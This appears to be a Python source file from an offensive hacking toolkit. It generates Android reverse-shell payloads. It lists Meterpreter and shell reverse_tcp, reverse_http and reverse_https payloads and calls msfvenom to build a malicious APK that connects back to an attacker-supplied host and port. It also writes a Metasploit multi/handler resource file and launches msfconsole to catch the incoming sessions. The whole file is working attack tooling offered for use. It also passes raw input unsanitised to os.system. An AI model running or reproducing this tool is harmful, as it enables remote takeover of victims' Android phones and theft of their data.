
#    Copyright (C) <2016>  <M U Suraj>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

# Created by suraj (#r00t)

import sys
from core import pycolor
import os

pyc = pycolor.pyColor()

payloads = ['android/meterpreter/reverse_http', \
		'android/meterpreter/reverse_https', \
		'android/meterpreter/reverse_tcp', \
		'android/shell/reverse_http',\
		'android/shell/reverse_https', \
		'android/shell/reverse_tcp']

def setoptions():
	print(pyc.Imp("PAYLOADS"))
	for i in payloads:
		print "[%d]"%(payloads.index(i)+1), i
	payload = int(raw_input("Payload> "))
	payload = payloads[payload-1]
	LHOST = raw_input("LHOST> ")
	LPORT = raw_input("LPORT> ")
	return payload, LHOST, LPORT

def generate(payload, LHOST, LPORT):
	print pyc.Info("Generating payload...")
	construct = "msfvenom -p %s LHOST=%s LPORT=%s -o temp.apk"%(payload, LHOST, LPORT)
	z=os.system(construct)	
	if not (z):
		print pyc.Succ("Payload created as temp.apk")
	else:
		print pyc.Err("Couldn't create the payload")
		sys.exit()
	return

def msfhandler(payload,LHOST,LPORT):
	print pyc.Info("Setting msf handler for %s payload"%(payload.replace('/','_')))
	fhandle = open("msf.rc",'w')
	fhandle.write("use exploit/multi/handler\n")
	fhandle.write("set PAYLOAD %s\n"%payload)
	fhandle.write("set LHOST %s\n"%LHOST)
	fhandle.write("set LPORT %s\n"%LPORT)
	fhandle.write("set ExitOnSession false\n")
	fhandle.write("exploit -j\n")
	fhandle.close()
	os.system('msfconsole -r msf.rc')
